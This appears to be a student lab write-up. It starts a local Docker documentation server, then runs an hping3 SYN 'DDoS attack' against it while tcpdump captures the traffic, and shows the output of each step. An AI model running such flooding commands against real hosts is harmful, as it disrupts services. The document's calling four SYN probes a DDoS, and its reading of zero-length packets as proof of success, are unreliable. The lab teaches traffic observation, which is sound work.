# Task1

A prerequisite for this task a copy of data collector server is needed, open a terminal and execute the following command:

```git clone https://git.swarmlab.io:3000/docs/Documentation```


Start the data collector server with the following command:

```./build.sh network-scanning```


Output:
```
===> Build docs
swarmlab-documentation
swarmlab-documentation
Using default tag: latest
latest: Pulling from antora
Digest: sha256:843a767ff93237591635109791d45c2112d7263413925f29d3beb244eab7e331
Status: Image is up to date for hub.swarmlab.io:5480/antora:latest
hub.swarmlab.io:5480/antora:latest

-----------------------------------------------------------------------------------------

*** On Error ***

    Get https://hub.swarmlab.io:5480/v2/: x509: certificate
    Pulling …
    ERROR: Get https://hub.swarmlab.io:5480/v2/: x509: certificate signed by unknown authority

*** run ***

    ./0-get-certs.sh

-----------------------------------------------------------------------------------------

---------------------------- *** WSL2 ***  --------------------------

   With Docker Desktop running on WSL 2, users can use: http://127.0.0.1:8080

---------------------------- *********** ---------------------------


[clone] ...git.swarmlab.io:3000/docs/Documentation.git [##########################################]
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:02  
          inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2453 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1673 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:3653035 (3.4 MiB)  TX bytes:92843 (90.6 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

Starting up http-server, serving build/site
Available on:
  http://127.0.0.1:8080
  http://172.17.0.2:8080
Hit CTRL-C to stop the server
```

The DDOS attack will target the 172.17.0.2:8080 ip:port.
Open a terminal and start a tcpdump to locate the attack with the following command:

```sudo tcpdump```

Output(after attack):
```
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on veth737dcab, link-type EN10MB (Ethernet), capture size 262144 bytes
19:38:41.464435 IP ubuntu.1988 > 172.17.0.2.http-alt: Flags [S], seq 1852578829, win 512, length 0
19:38:41.464469 IP 172.17.0.2.http-alt > ubuntu.1988: Flags [S.], seq 2181594135, ack 1852578830, win 64240, options [mss 1460], length 0
19:38:41.464483 IP ubuntu.1988 > 172.17.0.2.http-alt: Flags [R], seq 1852578830, win 0, length 0
19:38:42.464619 IP ubuntu.1989 > 172.17.0.2.http-alt: Flags [S], seq 943577023, win 512, length 0
19:38:42.464666 IP 172.17.0.2.http-alt > ubuntu.1989: Flags [S.], seq 1890022353, ack 943577024, win 64240, options [mss 1460], length 0
19:38:42.464682 IP ubuntu.1989 > 172.17.0.2.http-alt: Flags [R], seq 943577024, win 0, length 0
19:38:43.465204 IP ubuntu.1990 > 172.17.0.2.http-alt: Flags [S], seq 1181352384, win 512, length 0
19:38:43.465252 IP 172.17.0.2.http-alt > ubuntu.1990: Flags [S.], seq 2871466929, ack 1181352385, win 64240, options [mss 1460], length 0
19:38:43.465269 IP ubuntu.1990 > 172.17.0.2.http-alt: Flags [R], seq 1181352385, win 0, length 0
19:38:44.465417 IP ubuntu.1991 > 172.17.0.2.http-alt: Flags [S], seq 1496283475, win 512, length 0
19:38:44.465460 IP 172.17.0.2.http-alt > ubuntu.1991: Flags [S.], seq 2364895447, ack 1496283476, win 64240, options [mss 1460], length 0
19:38:44.465477 IP ubuntu.1991 > 172.17.0.2.http-alt: Flags [R], seq 1496283476, win 0, length 0
19:39:41.924688 IP6 ubuntu.mdns > ff02::fb.mdns: 0 [2q] PTR (QM)? _ipps._tcp.local. PTR (QM)? _ipp._tcp.local. (45)
19:39:48.384077 IP6 ubuntu > ip6-allrouters: ICMP6, router solicitation, length 16
^C
14 packets captured
14 packets received by filter
0 packets dropped by kernel
```

Open a third terminal and launch the DDOS attack with the following command:

```sudo hping3 -S 172.17.0.2 -p 8080```

Output:

```
HPING 172.17.0.2 (docker0 172.17.0.2): S set, 40 headers + 0 data bytes
len=44 ip=172.17.0.2 ttl=64 DF id=0 sport=8080 flags=SA seq=0 win=64240 rtt=8.1 ms
len=44 ip=172.17.0.2 ttl=64 DF id=0 sport=8080 flags=SA seq=1 win=64240 rtt=7.6 ms
len=44 ip=172.17.0.2 ttl=64 DF id=0 sport=8080 flags=SA seq=2 win=64240 rtt=7.2 ms
len=44 ip=172.17.0.2 ttl=64 DF id=0 sport=8080 flags=SA seq=3 win=64240 rtt=6.7 ms
^C
--- 172.17.0.2 hping statistic ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max = 6.7/7.4/8.1 ms
```

Evidence of the attack being successful can be noticed in the tcpdump output (packets with zero length are a result of the attack)

